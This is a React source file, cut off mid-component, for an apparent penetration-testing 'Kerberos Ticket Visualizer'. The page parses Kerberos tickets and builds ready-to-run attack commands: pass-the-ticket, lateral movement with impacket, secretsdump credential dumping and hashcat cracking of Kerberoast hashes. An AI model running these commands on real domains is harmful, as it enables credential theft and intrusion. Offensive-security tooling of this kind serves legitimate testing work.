import { useState, useRef, useEffect, useCallback } from 'react';
import {
  Box, Flex, Text, Textarea, Button, SimpleGrid, Spinner, Input,
  useToast,
} from '@chakra-ui/react';
import {
  AttachmentIcon, CopyIcon, CheckIcon, InfoIcon,
  WarningTwoIcon, CloseIcon, DeleteIcon, TimeIcon, LockIcon,
} from '@chakra-ui/icons';
import { motion, AnimatePresence } from 'framer-motion';
import { useParams } from 'react-router-dom';

const MotionBox = motion(Box);

// ── Colors ────────────────────────────────────────────────────────────────────
const ACCENT = '#63B3ED';
const GREEN  = '#68D391';
const RED    = '#FC8181';
const ORANGE = '#F6AD55';
const PURPLE = '#9F7AEA';
const CYAN   = '#76E4F7';

const authHeader = () => ({ Authorization: `Bearer ${localStorage.getItem('token') || ''}` });

// ── Etype metadata ────────────────────────────────────────────────────────────
const ETYPE_RISK = {
  rc4_hmac:                   { risk: 'HIGH',     color: ORANGE, label: 'RC4-HMAC'                   },
  'rc4-hmac':                 { risk: 'HIGH',     color: ORANGE, label: 'RC4-HMAC'                   },
  rc4_hmac_exp:               { risk: 'CRITICAL', color: RED,    label: 'RC4-HMAC-EXP'               },
  des_cbc_md5:                { risk: 'CRITICAL', color: RED,    label: 'DES-CBC-MD5'                 },
  des_cbc_crc:                { risk: 'CRITICAL', color: RED,    label: 'DES-CBC-CRC'                 },
  'aes128-cts-hmac-sha1-96':  { risk: 'LOW',      color: GREEN,  label: 'AES128-CTS-HMAC-SHA1-96'    },
  'aes256-cts-hmac-sha1-96':  { risk: 'LOW',      color: GREEN,  label: 'AES256-CTS-HMAC-SHA1-96'    },
  aes128_cts_hmac_sha1_96:    { risk: 'LOW',      color: GREEN,  label: 'AES128-CTS-HMAC-SHA1-96'    },
  aes256_cts_hmac_sha1_96:    { risk: 'LOW',      color: GREEN,  label: 'AES256-CTS-HMAC-SHA1-96'    },
};

function etypeInfo(raw = '') {
  const key = raw.toLowerCase().replace(/\s*\(.*\)/, '').trim().replace(/-/g, '_');
  return ETYPE_RISK[key] || ETYPE_RISK[raw.toLowerCase()] || { risk: 'UNKNOWN', color: ACCENT, label: raw };
}

// ── Shared UI ─────────────────────────────────────────────────────────────────
const Label = ({ children }) => (
  <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
    letterSpacing="wider" fontWeight="bold" mb={1.5}>{children}</Text>
);

const Card = ({ children, accentColor = ACCENT, ...rest }) => (
  <Box pos="relative" bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
    borderRadius="14px" overflow="hidden" {...rest}>
    <Box pos="absolute" top="0" left="0" right="0" h="2px"
      style={{ background: `linear-gradient(to right, transparent, ${accentColor}80, transparent)` }} />
    {children}
  </Box>
);

const StatCard = ({ label, value, color, delay = 0 }) => (
  <MotionBox initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.22, delay }}
    px={4} py={3} borderRadius="12px" bg="var(--dash-card-bg)"
    border="1px solid var(--dash-card-border)" pos="relative" overflow="hidden">
    <Box pos="absolute" top={0} left={0} right={0} h="2px"
      style={{ background: `linear-gradient(to right, transparent, ${color}80, transparent)` }} />
    <Text fontSize="18px" fontWeight="bold" color={color} lineHeight={1} noOfLines={1}>{value}</Text>
    <Text fontSize="11px" color="var(--dash-text-muted)" mt={1}>{label}</Text>
  </MotionBox>
);

// ── Value row with copy ───────────────────────────────────────────────────────
const Field = ({ label, value, color, mono = true, wrap = false }) => {
  const [copied, setCopied] = useState(false);
  if (!value) return null;
  const copy = () => {
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <Box>
      <Label>{label}</Label>
      <Flex align={wrap ? 'flex-start' : 'center'} gap={2}
        bg="rgba(0,0,0,0.2)" border="1px solid rgba(255,255,255,0.07)"
        borderRadius="8px" px={3} py="8px">
        <Text flex="1" fontSize="12px" fontFamily={mono ? 'mono' : 'inherit'}
          color={color || 'var(--dash-text-primary)'}
          wordBreak="break-all" whiteSpace={wrap ? 'pre-wrap' : 'normal'}>
          {value}
        </Text>
        <Box flexShrink={0} cursor="pointer" onClick={copy}
          color={copied ? GREEN : 'var(--dash-text-muted)'}
          _hover={{ color: 'white' }} transition="color 0.15s">
          {copied ? <CheckIcon boxSize={3} /> : <CopyIcon boxSize={3} />}
        </Box>
      </Flex>
    </Box>
  );
};

// ── Flag chips ────────────────────────────────────────────────────────────────
const Flags = ({ raw }) => {
  if (!raw) return null;
  // "(0x50a00000) forwardable, proxiable, renewable, pre_authent"
  const hexM  = raw.match(/\(([^)]+)\)/);
  const names = raw.replace(/\([^)]+\)\s*/, '').split(',').map(s => s.trim()).filter(Boolean);
  const risky = ['forwardable', 'renewable', 'forwarded', 'proxy', 'postdated', 'invalid'];
  return (
    <Box>
      <Flex align="center" justify="space-between" mb={2}>
        <Label>Flags</Label>
        {hexM && <Text fontSize="10px" fontFamily="mono" color="var(--dash-text-muted)">{hexM[0]}</Text>}
      </Flex>
      <Flex gap={2} flexWrap="wrap">
        {names.map(f => {
          const isRisky = risky.some(r => f.toLowerCase().includes(r));
          const c = isRisky ? ORANGE : GREEN;
          return (
            <Box key={f} px={2} py="3px" borderRadius="6px"
              bg={`${c}12`} border={`1px solid ${c}40`}>
              <Text fontSize="10px" fontWeight="bold" color={c} fontFamily="mono">{f}</Text>
            </Box>
          );
        })}
      </Flex>
    </Box>
  );
};

// ── Severity badge ────────────────────────────────────────────────────────────
const SevBadge = ({ sev }) => {
  const c = { CRITICAL: RED, HIGH: ORANGE, MEDIUM: '#F6E05E', LOW: GREEN }[sev] || ACCENT;
  return (
    <Box px={2} py="2px" borderRadius="4px" bg={`${c}18`} border={`1px solid ${c}50`} display="inline-block">
      <Text fontSize="9px" fontWeight="bold" color={c} letterSpacing="widest">{sev}</Text>
    </Box>
  );
};

// ── Code block ────────────────────────────────────────────────────────────────
const CodeBlock = ({ code }) => {
  const [copied, setCopied] = useState(false);
  const copy = () => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 1500); };
  return (
    <Box pos="relative" bg="rgba(0,0,0,0.35)" border="1px solid rgba(255,255,255,0.08)"
      borderRadius="8px" px={4} py={3}>
      <Box pos="absolute" top={2} right={2} cursor="pointer" onClick={copy}
        color={copied ? GREEN : 'var(--dash-text-muted)'} _hover={{ color: 'white' }} transition="color 0.15s">
        {copied ? <CheckIcon boxSize={3} /> : <CopyIcon boxSize={3} />}
      </Box>
      <Text fontSize="11px" fontFamily="mono" color="#a3e635" whiteSpace="pre-wrap" lineHeight="1.9" pr={5}>
        {code}
      </Text>
    </Box>
  );
};

// ── Build commands from parsed cred ──────────────────────────────────────────
function buildCmds(cred, target) {
  const user   = cred['User Name']    || 'USER';
  const realm  = cred['User Realm']   || 'DOMAIN.LOCAL';
  const svc    = cred['Service Name'] || '';
  const domain = realm.toLowerCase();
  const host   = target || svc.split('/')[1]?.split('@')[0] || 'TARGET';
  const isTGT  = svc.toLowerCase().includes('krbtgt');
  const hash   = cred['Kerberoast hash'];

  const impacket = `# 1. Export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# 2. Lateral movement${isTGT ? `
impacket-psexec      -k -no-pass ${domain}/${user}@${host}
impacket-wmiexec     -k -no-pass ${domain}/${user}@${host}
impacket-smbexec     -k -no-pass ${domain}/${user}@${host}
impacket-atexec      -k -no-pass ${domain}/${user}@${host} "whoami"` : `
impacket-mssqlclient -k -no-pass ${domain}/${user}@${host}  # MSSQLSvc
impacket-psexec      -k -no-pass ${domain}/${user}@${host}`}

# 3. Dump credentials
impacket-secretsdump -k -no-pass ${domain}/${user}@${host}

# 4. List shares
impacket-smbclient   -k -no-pass ${domain}/${user}@${host}`;

  const rubeus = `# Pass-the-Ticket
Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Describe ticket
Rubeus.exe describe /ticket:<BASE64_TICKET>
${cred['Flags']?.includes('renewable') ? `
# Renew ticket
Rubeus.exe renew /ticket:<BASE64_TICKET> /ptt` : ''}
# Request TGS from this ${isTGT ? 'TGT' : 'ticket'}
Rubeus.exe asktgs /ticket:<BASE64_TICKET> /service:${svc || 'cifs/TARGET'} /ptt`;

  const mimikatz = `# Import ticket
kerberos::ptc /path/to/ticket.ccache

# Or from base64
[System.IO.File]::WriteAllBytes("C:\\ticket.kirbi", [Convert]::FromBase64String("<B64>"))
kerberos::ptt C:\\ticket.kirbi

# Verify import
kerberos::list

# Purge all tickets
kerberos::purge`;

  const hashcat = hash
    ? `# Save hash to file
echo '${hash.slice(0, 60)}...' > hash.txt

# Crack RC4 TGS hash (mode 13100)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule

# With john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    : null;

  return { impacket, rubeus, mimikatz, hashcat };
}

// ── Relative time ─────────────────────────────────────────────────────────────
function relTime(iso) {
  const diff  = Date.now() - new Date(iso);
  const mins  = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);
  const days  = Math.floor(diff / 86400000);
  if (mins  < 1)  return 'just now';
  if (mins  < 60) return `${mins}m ago`;
  if (hours < 24) return `${hours}h ago`;
  return `${days}d ago`;
}

// ── Main View ─────────────────────────────────────────────────────────────────
const KerberosView = () => {
  const { slug }   = useParams();
  const toast      = useToast();
  const fileRef    = useRef(null);

  const [input,      setInput]      = useState('');
  const [result,     setResult]     = useState(null);
  const [loading,    setLoading]    = useState(false);
  const [error,      setError]      = useState('');
  const [target,     setTarget]     = useState('');
  const [tool,       setTool]       = useState('impacket');
  const [credIdx,    setCredIdx]    = useState(0);

  // History
  const [history,    setHistory]    = useState([]);
  const [histLabel,  setHistLabel]  = useState('');
  const [saving,     setSaving]     = useState(false);
  const [viewingId,  setViewingId]  = useState(null); // history entry being viewed

  // ── Load history ──
  const loadHistory = useCallback(async () => {
    if (!slug) return;
    try {
      const res  = await fetch(`/api/kerberos/history?engagement=${slug}`, { headers: authHeader() });
      const data = await res.json();
      if (res.ok) setHistory(Array.isArray(data) ? data : []);
    } catch {}
  }, [slug]);

  useEffect(() => { loadHistory(); }, [loadHistory]);

  // ── Parse ──
  const callApi = async (body, isForm = false) => {
    setLoading(true); setError(''); setResult(null); setCredIdx(0); setViewingId(null);
    try {
      const res  = await fetch('/api/kerberos/parse', {
        method: 'POST',
        headers: isForm ? authHeader() : { ...authHeader(), 'Content-Type': 'application/json' },
        body,
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || data.hint || 'Parse failed');
      if (!data.credCount) throw new Error('No credentials found in ticket');
      setResult(data);
      setHistLabel('');
    } catch (e) { setError(e.message); }
    setLoading(false);
  };

  const parseBase64 = () => {
    if (!input.trim()) { setError('Paste a base64 ticket first'); return; }
    callApi(JSON.stringify({ base64: input.trim() }));
  };

  const onFile = e => {
    const f = e.target.files?.[0]; if (!f) return;
    setHistLabel(f.name);
    const fd = new FormData(); fd.append('file', f);
    callApi(fd, true);
    e.target.value = '';
  };

  // ── Save to history ──
  const saveToHistory = async () => {
    if (!result || !slug) {
      toast({ title: !slug ? 'No engagement slug' : 'No parsed result to save', status: 'warning', duration: 2000 });
      return;
    }
    setSaving(true);
    try {
      const res  = await fetch('/api/kerberos/history', {
        method:  'POST',
        headers: { ...authHeader(), 'Content-Type': 'application/json' },
        body:    JSON.stringify({ engagementSlug: slug, label: histLabel, result }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
      toast({ title: 'Saved to history', status: 'success', duration: 1500 });
      setHistLabel('');
      await loadHistory();
    } catch (e) {
      toast({ title: `Save failed: ${e.message}`, status: 'error', duration: 4000 });
    }
    setSaving(false);
  };

  // ── Load history entry ──
  const viewEntry = async (entry) => {
    setViewingId(entry._id);
    setResult(entry.result);
    setCredIdx(0);
    setError('');
  };

  // ── Delete history entry ──
  const deleteEntry = async (id, e) => {
    e.stopPropagation();
    try {
      await fetch(`/api/kerberos/history/${id}`, { method: 'DELETE', headers: authHeader() });
      setHistory(p => p.filter(h => h._id !== id));
      if (viewingId === id) { setResult(null); setViewingId(null); }
      toast({ title: 'Deleted', status: 'info', duration: 1200 });
    } catch {}
  };

  const cred   = result?.credentials?.[credIdx];
  const eInfo  = etypeInfo(cred?.['KeyType'] || cred?.ticket?.['Encryption type'] || '');
  const isTGT  = (cred?.['Service Name'] || '').toLowerCase().includes('krbtgt');
  const hasKrb = !!cred?.['Kerberoast hash'];
  const cmds   = cred ? buildCmds(cred, target) : null;
  const tools  = ['impacket', 'rubeus', 'mimikatz', ...(hasKrb ? ['hashcat'] : [])];

  return (
    <MotionBox initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.3 }} px={6} pb={12} pt={5}>

      {/* ── Header ── */}
      <Flex align="flex-start" justify="space-between" mb={5}>
        <Box>
          <Text fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
            Kerberos Ticket <Text as="span" color="red.400">Visualizer</Text>
          </Text>
          <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
            Parse .ccache tickets via impacket-describeTicket · inspect PAC, SPN, flags · generate attack commands
          </Text>
        </Box>
      </Flex>

      {/* ── Info banner ── */}
      <Box mb={5} px={4} py={3} borderRadius="10px"
        bg="rgba(99,179,237,0.07)" border="1px solid rgba(99,179,237,0.25)">
        <Flex align="center" gap={2} mb={2}>
          <InfoIcon boxSize={3} color={ACCENT} />
          <Text fontSize="10px" fontWeight="bold" color={ACCENT}
            textTransform="uppercase" letterSpacing="wider">Kerberos Ticket Visualizer</Text>
        </Flex>
        <Flex gap={4} flexWrap="wrap">
          {[
            'Powered by impacket-describeTicket running inside secsi/impacket Docker container',
            'Parses session key, user/service identity, validity window, flags and encryption type',
            'Auto-detects Kerberoastable TGS tickets and generates hashcat crack commands',
          ].map(t => (
            <Flex key={t} align="center" gap={1.5}>
              <Box w="4px" h="4px" borderRadius="full" bg={ACCENT} flexShrink={0} />
              <Text fontSize="11px" color="var(--dash-text-secondary)">{t}</Text>
            </Flex>
          ))}
        </Flex>
      </Box>

      {/* ── Stats ── */}
      <Flex gap={3} mb={5} flexWrap="wrap">
        <StatCard label="Ticket Type"   value={result ? (isTGT ? 'TGT' : 'TGS') : '—'}            color={isTGT ? RED : ACCENT}   delay={0}    />
        <StatCard label="Credentials"   value={result?.credCount ?? '—'}                           color={PURPLE}                 delay={0.04} />
        <StatCard label="Enc Type"      value={eInfo.label || '—'}                                 color={eInfo.color}            delay={0.08} />
        <StatCard label="Kerberoastable" value={result ? (hasKrb ? 'Yes ⚠' : 'No') : '—'}        color={hasKrb ? RED : GREEN}   delay={0.12} />
      </Flex>

      {/* ── Viewing from history banner ── */}
      {viewingId && (
        <Flex align="center" justify="space-between" mb={5} px={4} py={3} borderRadius="10px"
          bg="rgba(159,122,234,0.07)" border="1px solid rgba(159,122,234,0.3)">
          <Flex align="center" gap={2}>
            <TimeIcon boxSize={3} color={PURPLE} />
            <Text fontSize="11px" color={PURPLE} fontWeight="bold">Viewing saved ticket from history</Text>
            <Text fontSize="11px" color="var(--dash-text-muted)">
              — {history.find(h => h._id === viewingId)?.label || 'entry'}
            </Text>
          </Flex>
          <Button size="xs" variant="ghost" color="var(--dash-text-muted)"
            _hover={{ color: 'white' }}
            onClick={() => { setResult(null); setViewingId(null); setInput(''); }}>
            ✕ Clear
          </Button>
        </Flex>
      )}

      <Flex gap={5} flexWrap="wrap" align="flex-start">

        {/* ── Left: input + parsed fields ── */}
        <Flex direction="column" gap={5} flex="1" minW="340px">

          {/* Input */}
          <Card accentColor={ACCENT} px={5} pt={5} pb={5}>
            <Label>Ticket Input</Label>
            <Textarea
              value={input} onChange={e => setInput(e.target.value)}
              placeholder={'Paste base64-encoded .ccache ticket here...\n\nOr click "Upload .ccache" to pick a file directly.\n\nRequires: docker pull secsi/impacket'}
              bg="rgba(0,0,0,0.25)" border="1px solid rgba(255,255,255,0.1)"
              borderRadius="10px" px={4} py={3} fontSize="11px" fontFamily="mono"
              color="var(--dash-text-primary)" resize="vertical" rows={5}
              _placeholder={{ color: 'var(--dash-text-muted)', fontSize: '11px' }}
              _hover={{ border: `1px solid ${ACCENT}40` }}
              _focus={{ border: `1px solid ${ACCENT}70`, boxShadow: `0 0 0 1px ${ACCENT}30` }}
              mb={3}
            />

            {error && (
              <Flex align="center" gap={2} mb={3} px={3} py="9px"
                bg="rgba(252,129,129,0.08)" border="1px solid rgba(252,129,129,0.3)" borderRadius="8px">
                <CloseIcon boxSize={2.5} color={RED} flexShrink={0} />
                <Text fontSize="11px" color={RED}>{error}</Text>
              </Flex>
            )}

            <Flex gap={2}>
              <Button flex="1" size="sm"
                bg={`${ACCENT}20`} color={ACCENT} border={`1px solid ${ACCENT}50`}
                _hover={{ bg: `${ACCENT}35` }} borderRadius="8px" fontSize="12px"
                isLoading={loading} loadingText="Running impacket…"
                onClick={parseBase64}>
                Parse Base64
              </Button>
              <input ref={fileRef} type="file" accept=".ccache,.kirbi,.bin"
                style={{ display: 'none' }} onChange={onFile} />
              <Button size="sm" leftIcon={<AttachmentIcon />}
                bg="rgba(255,255,255,0.05)" color="var(--dash-text-secondary)"
                border="1px solid rgba(255,255,255,0.1)"
                _hover={{ bg: 'rgba(255,255,255,0.1)', color: 'white' }}
                borderRadius="8px" fontSize="12px"
                onClick={() => fileRef.current?.click()}>
                Upload .ccache
              </Button>
            </Flex>
          </Card>

          {/* Credential tabs (if multiple) */}
          {result && result.credentials.length > 1 && (
            <Flex gap={2} flexWrap="wrap">
              {result.credentials.map((_, i) => (
                <Box key={i} px={3} py="6px" borderRadius="8px" cursor="pointer"
                  bg={credIdx === i ? `${ACCENT}20` : 'rgba(255,255,255,0.04)'}
                  border={`1px solid ${credIdx === i ? ACCENT : 'rgba(255,255,255,0.1)'}`}
                  onClick={() => setCredIdx(i)}>
                  <Text fontSize="11px" fontWeight="bold"
                    color={credIdx === i ? ACCENT : 'var(--dash-text-muted)'}>
                    Credential [{i}]
                  </Text>
                </Box>
              ))}
            </Flex>
          )}

          {/* Decoded fields */}
          <AnimatePresence>
            {cred && (
              <MotionBox key={credIdx} initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.25 }}>
                <Flex direction="column" gap={4}>

                  {/* Session key */}
                  <Card accentColor={CYAN} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={CYAN} boxShadow={`0 0 6px ${CYAN}`} />
                      <Text fontSize="11px" fontWeight="bold" color={CYAN}
                        textTransform="uppercase" letterSpacing="widest">Session</Text>
                    </Flex>
                    <Flex direction="column" gap={3}>
                      <Field label="Ticket Session Key" value={cred['Ticket Session Key']} color={CYAN} />
                      <Field label="Base64 Key"         value={cred['Base64(key)']} />
                    </Flex>
                  </Card>

                  {/* Identity */}
                  <Card accentColor={ACCENT} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={ACCENT} boxShadow={`0 0 6px ${ACCENT}`} />
                      <Text fontSize="11px" fontWeight="bold" color={ACCENT}
                        textTransform="uppercase" letterSpacing="widest">User Identity</Text>
                    </Flex>
                    <SimpleGrid columns={2} gap={3}>
                      <Field label="User Name"  value={cred['User Name']}  color={GREEN} />
                      <Field label="User Realm" value={cred['User Realm']} color={ACCENT} />
                    </SimpleGrid>
                  </Card>

                  {/* Service */}
                  <Card accentColor={PURPLE} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={PURPLE} boxShadow={`0 0 6px ${PURPLE}`} />
                      <Text fontSize="11px" fontWeight="bold" color={PURPLE}
                        textTransform="uppercase" letterSpacing="widest">Service</Text>
                      <Box ml="auto" px={2} py="2px" borderRadius="4px"
                        bg={isTGT ? `${RED}18` : `${PURPLE}18`}
                        border={`1px solid ${isTGT ? RED : PURPLE}50`}>
                        <Text fontSize="9px" fontWeight="bold" color={isTGT ? RED : PURPLE}>
                          {isTGT ? 'TGT' : 'TGS'}
                        </Text>
                      </Box>
                    </Flex>
                    <Flex direction="column" gap={3}>
                      <Field label="Service Name"  value={cred['Service Name']}  color={PURPLE} />
                      <Field label="Service Realm" value={cred['Service Realm']} />
                      {cred.ticket?.['Service Name']  && <Field label="Ticket SPN"   value={cred.ticket['Service Name']}  color={PURPLE} />}
                      {cred.ticket?.['Service Realm'] && <Field label="Ticket Realm" value={cred.ticket['Service Realm']} />}
                    </Flex>
                  </Card>

                  {/* Validity */}
                  <Card accentColor={GREEN} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={GREEN} boxShadow={`0 0 6px ${GREEN}`} />
                      <Text fontSize="11px" fontWeight="bold" color={GREEN}
                        textTransform="uppercase" letterSpacing="widest">Validity Window</Text>
                    </Flex>
                    <SimpleGrid columns={2} gap={3}>
                      <Field label="Start Time"  value={cred['Start Time']}  color={GREEN} mono={false} />
                      <Field label="End Time"    value={cred['End Time']}    color={GREEN} mono={false} />
                      <Field label="Renew Till"  value={cred['RenewTill']}   color={GREEN} mono={false} />
                    </SimpleGrid>
                  </Card>

                  {/* Flags */}
                  <Card accentColor={ORANGE} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={ORANGE} boxShadow={`0 0 6px ${ORANGE}`} />
                      <Text fontSize="11px" fontWeight="bold" color={ORANGE}
                        textTransform="uppercase" letterSpacing="widest">Flags</Text>
                    </Flex>
                    <Flags raw={cred['Flags']} />
                  </Card>

                  {/* Encryption */}
                  <Card accentColor={eInfo.color} px={5} pt={5} pb={5}>
                    <Flex align="center" gap={2} mb={4}>
                      <Box w="6px" h="6px" borderRadius="full" bg={eInfo.color} boxShadow={`0 0 6px ${eInfo.color}`} />
                      <Text fontSize="11px" fontWeight="bold" color={eInfo.color}
                        textTransform="uppercase" letterSpacing="widest">Encryption</Text>
                      <Box ml="auto"><SevBadge sev={eInfo.risk} /></Box>
                    </Flex>
                    <SimpleGrid columns={2} gap={3}>
                      <Box>
                        <Label>Key Type</Label>
                        <Text fontSize="13px" fontWeight="bold" fontFamily="mono" color={eInfo.color}>
                          {cred['KeyType'] || '—'}
                        </Text>
                      </Box>
                      <Box>
                        <Label>Ticket Enc Type</Label>
                        <Text fontSize="12px" fontFamily="mono" color="var(--dash-text-primary)">
                          {cred.ticket?.['Encryption type'] || '—'}
                        </Text>
                      </Box>
                    </SimpleGrid>
                    {(eInfo.risk === 'HIGH' || eInfo.risk === 'CRITICAL') && (
                      <Flex align="center" gap={2} mt={3} px={3} py="9px"
                        bg="rgba(252,129,129,0.08)" border="1px solid rgba(252,129,129,0.25)" borderRadius="8px">
                        <WarningTwoIcon boxSize={3} color={RED} flexShrink={0} />
                        <Text fontSize="11px" color={RED}>
                          RC4-HMAC — ticket hash is crackable offline with hashcat mode 13100
                        </Text>
                      </Flex>
                    )}
                  </Card>

                  {/* Errors from impacket */}
                  {cred.errors?.length > 0 && (
                    <Card accentColor="rgba(255,255,255,0.1)" px={5} pt={4} pb={4}>
                      <Label>Impacket Notes</Label>
                      {cred.errors.map((e, i) => (
                        <Flex key={i} align="flex-start" gap={2} mt={2}>
                          <CloseIcon boxSize={2.5} color="var(--dash-text-muted)" mt="2px" flexShrink={0} />
                          <Text fontSize="11px" color="var(--dash-text-muted)">{e}</Text>
                        </Flex>
                      ))}
                    </Card>
                  )}
                </Flex>
              </MotionBox>
            )}
          </AnimatePresence>
        </Flex>

        {/* ── Right: kerberoast + commands ── */}
        <Flex direction="column" gap={5} flex="1" minW="340px">

          {/* Kerberoast hash */}
          {cred && hasKrb && (
            <MotionBox initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}>
              <Card accentColor={RED} px={5} pt={5} pb={5}>
                <Flex align="center" gap={2} mb={4}>
                  <Box w="6px" h="6px" borderRadius="full" bg={RED} boxShadow={`0 0 6px ${RED}`} />
                  <Text fontSize="11px" fontWeight="bold" color={RED}
                    textTransform="uppercase" letterSpacing="widest">Kerberoast Hash</Text>
                  <SevBadge sev="HIGH" />
                </Flex>
                <Field label="Hash (hashcat mode 13100)" value={cred['Kerberoast hash']} color={RED} wrap />
              </Card>
            </MotionBox>
          )}

          {/* Commands */}
          {cred && cmds && (
            <MotionBox initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3, delay: 0.05 }}>
              <Card accentColor={GREEN} px={5} pt={5} pb={5}>
                <Flex align="center" gap={2} mb={4}>
                  <Box w="6px" h="6px" borderRadius="full" bg={GREEN} boxShadow={`0 0 6px ${GREEN}`} />
                  <Text fontSize="11px" fontWeight="bold" color={GREEN}
                    textTransform="uppercase" letterSpacing="widest">Attack Commands</Text>
                </Flex>

                {/* Target host */}
                <Box mb={4}>
                  <Label>Target Host (optional)</Label>
                  <Box as="input" value={target} onChange={e => setTarget(e.target.value)}
                    placeholder={cred['Service Name']?.split('/')[1]?.split('@')[0] || 'DC01.DOMAIN.LOCAL'}
                    style={{
                      width: '100%', background: 'rgba(255,255,255,0.05)',
                      border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px',
                      padding: '8px 16px', fontSize: '12px',
                      color: 'var(--dash-text-primary)', fontFamily: 'monospace', outline: 'none',
                    }} />
                </Box>

                {/* Tool tabs */}
                <Flex gap={1} mb={4} bg="rgba(255,255,255,0.04)"
                  border="1px solid rgba(255,255,255,0.08)" borderRadius="8px" p={1}>
                  {tools.map(t => (
                    <Box key={t} flex="1" py="5px" borderRadius="6px" cursor="pointer" textAlign="center"
                      bg={tool === t ? 'rgba(255,255,255,0.1)' : 'transparent'}
                      transition="all 0.15s" onClick={() => setTool(t)}>
                      <Text fontSize="10px" fontWeight="bold" textTransform="capitalize"
                        color={tool === t ? 'white' : 'var(--dash-text-muted)'}>
                        {t}
                      </Text>
                    </Box>
                  ))}
                </Flex>

                <CodeBlock code={cmds[tool] || ''} />
              </Card>
            </MotionBox>
          )}

          {/* Empty / loading state */}
          {!result && (
            <Card accentColor="rgba(255,255,255,0.08)" px={5} pt={8} pb={8}>
              <Flex direction="column" align="center" gap={3}>
                {loading
                  ? <><Spinner color={ACCENT} size="lg" /><Text fontSize="12px" color="var(--dash-text-muted)" mt={2}>Running impacket-describeTicket…</Text></>
                  : <>
                    <Flex w="48px" h="48px" borderRadius="12px" align="center" justify="center"
                      bg={`${ACCENT}12`} border={`1px solid ${ACCENT}30`}>
                      <LockIcon boxSize={5} color={ACCENT} />
                    </Flex>
                    <Text fontSize="13px" fontWeight="bold" color="var(--dash-text-primary)">No ticket parsed yet</Text>
                    <Text fontSize="11px" color="var(--dash-text-muted)" textAlign="center" maxW="260px">
                      Upload a .ccache file or paste a base64-encoded ticket and click Parse Base64
                    </Text>
                    <Box mt={3} px={4} py={3} borderRadius="8px"
                      bg="rgba(99,179,237,0.06)" border="1px solid rgba(99,179,237,0.2)" w="100%">
                      <Text fontSize="10px" color={ACCENT} fontFamily="mono" mb={1}># Get ticket with impacket</Text>
                      <Text fontSize="10px" color="var(--dash-text-secondary)" fontFamily="mono">
                        getTGT.py DOMAIN/user -hashes :NTHASH{'\n'}
                        getST.py DOMAIN/user -spn MSSQLSvc/dc02
                      </Text>
                      <Text fontSize="10px" color={ACCENT} fontFamily="mono" mt={2} mb={1}># From mimikatz</Text>
                      <Text fontSize="10px" color="var(--dash-text-secondary)" fontFamily="mono">
                        sekurlsa::tickets /export
                      </Text>
                    </Box>
                  </>
                }
              </Flex>
            </Card>
          )}

          {/* Save to History */}
          {result && !viewingId && (
            <MotionBox initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3, delay: 0.1 }}>
              <Card accentColor={PURPLE} px={5} pt={5} pb={5}>
                <Flex align="center" gap={2} mb={3}>
                  <Box w="6px" h="6px" borderRadius="full" bg={PURPLE} boxShadow={`0 0 6px ${PURPLE}`} />
                  <Text fontSize="11px" fontWeight="bold" color={PURPLE}
                    textTransform="uppercase" letterSpacing="widest">Save to History</Text>
                </Flex>
                <Label>Label</Label>
                <Input value={histLabel} onChange={e => setHistLabel(e.target.value)}
                  placeholder="auto-generated from ticket if empty…"
                  bg="rgba(0,0,0,0.25)" border="1px solid rgba(255,255,255,0.1)"
                  borderRadius="8px" px={3} fontSize="12px" h="36px"
                  color="var(--dash-text-primary)"
                  _placeholder={{ color: 'var(--dash-text-muted)', fontSize: '11px' }}
                  _hover={{ border: `1px solid ${PURPLE}40` }}
                  _focus={{ border: `1px solid ${PURPLE}70`, boxShadow: `0 0 0 1px ${PURPLE}30` }}
                  mb={3} />
                <Button w="100%" size="sm"
                  bg={`${PURPLE}20`} color={PURPLE} border={`1px solid ${PURPLE}50`}
                  _hover={{ bg: `${PURPLE}35` }} borderRadius="8px" fontSize="12px"
                  isLoading={saving} loadingText="Saving…"
                  onClick={saveToHistory}>
                  Save Ticket to History
                </Button>
              </Card>
            </MotionBox>
          )}

          {/* History panel — always visible */}
          <Card accentColor={ACCENT} px={5} pt={5} pb={5}>
            <Flex align="center" justify="space-between" mb={3}>
              <Flex align="center" gap={2}>
                <Box w="6px" h="6px" borderRadius="full" bg={ACCENT} boxShadow={`0 0 6px ${ACCENT}`} />
                <Text fontSize="11px" fontWeight="bold" color={ACCENT}
                  textTransform="uppercase" letterSpacing="widest">Saved Tickets</Text>
              </Flex>
